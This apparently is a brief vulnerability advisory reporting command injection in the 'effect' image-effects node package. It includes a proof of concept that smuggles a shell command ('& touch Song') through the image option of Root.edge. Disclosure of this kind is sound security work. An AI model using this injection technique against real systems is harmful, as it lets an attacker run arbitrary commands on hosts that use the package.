# Overview
`effect` is a node package that allows you to add effects on images, this package are vulnerable to Command Injection. The argument options can be controlled by users without any sanitization.

# Proof of Concept
```
var Root= require("effect");
var options  = {
image: "& touch Song"
}
Root.edge(options, function(){});
```